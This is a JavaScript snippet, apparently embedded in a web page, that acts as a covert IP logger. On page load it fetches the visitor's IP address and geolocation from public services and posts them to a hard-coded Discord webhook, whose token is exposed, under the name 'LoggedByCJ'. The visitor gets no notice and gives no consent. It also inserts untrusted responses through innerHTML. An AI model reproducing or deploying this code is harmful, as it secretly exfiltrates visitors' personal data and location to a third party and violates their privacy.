      var wbhk = 'https://discord.com/api/webhooks/1397312307410763866/S9LNYKkcfqWYTACsTCM_ita9fHBIJ93zQzVb3za2p-3LJ7rGJz0xgulV_ChGCP6-4hi6'
      function get_information(link, callback) {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", link, true);
        xhr.onreadystatechange = function() {
          if (xhr.readyState === 4) {
            callback(xhr.responseText);
          }
        };
        xhr.send(null);
      }
      get_information("https://ipapi.co/json", function(text) {
        var div = document.createElement("div");
        div.innerHTML = text;
        div.id = "razzylog";
        const secondList = document.getElementsByClassName("header")[0]
        secondList.appendChild(div)
      });
      get_information("https://api.ipify.org/", function(text) {
        var div = document.createElement("div");
        div.innerHTML = text;
        div.id = "ipppp";
        const secondList = document.getElementsByClassName("header")[0]
        secondList.appendChild(div)
      });
      function ipLogByCJ() {
        var ispp = document.getElementById('ipppp').innerHTML
        var ispp2 = document.getElementById('ipppp').innerHTML + "/json/"
        var extra = document.getElementById("razzylog").innerHTML
        const request = new XMLHttpRequest();
        request.open("POST", wbhk);
        request.setRequestHeader('Content-type', 'application/json');
        const params = {
          username: "LoggedByCJ",
          content: "**Ip** : _" + ispp + "_\n**Raw** : _https://api.techniknews.net/ipgeo/" + ispp + "_\n**Raw** : _https://ipapi.co/" + ispp2 + "_\n**Extra Info** : ```" + extra + "```"
        }
        request.send(JSON.stringify(params));
      }
      setTimeout(function() {
        ipLogByCJ()
      }, 700);
